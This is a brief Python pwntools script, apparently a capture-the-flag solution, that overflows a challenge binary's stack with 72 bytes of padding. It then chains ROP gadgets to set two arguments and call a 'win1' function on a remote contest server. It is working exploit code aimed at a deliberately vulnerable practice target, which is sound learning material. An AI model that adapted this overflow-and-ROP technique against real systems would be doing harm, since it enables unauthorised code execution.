from pwn import *
exe = ELF('gaga1', checksec=False)
rdi = 0x00000000004013b3
rsi = 0x00000000004013b1
payload = b"A" * 72
payload += p64(rdi) + p64(0x1337)
payload += p64(rsi) + p64(0x4141) + p64(0)
payload += p64(exe.sym['win1'])

# p = process(exe.path)
p = remote('challs.actf.co', 31301)
input()
p.recvuntil(b': ')
p.sendline(payload)
p.interactive()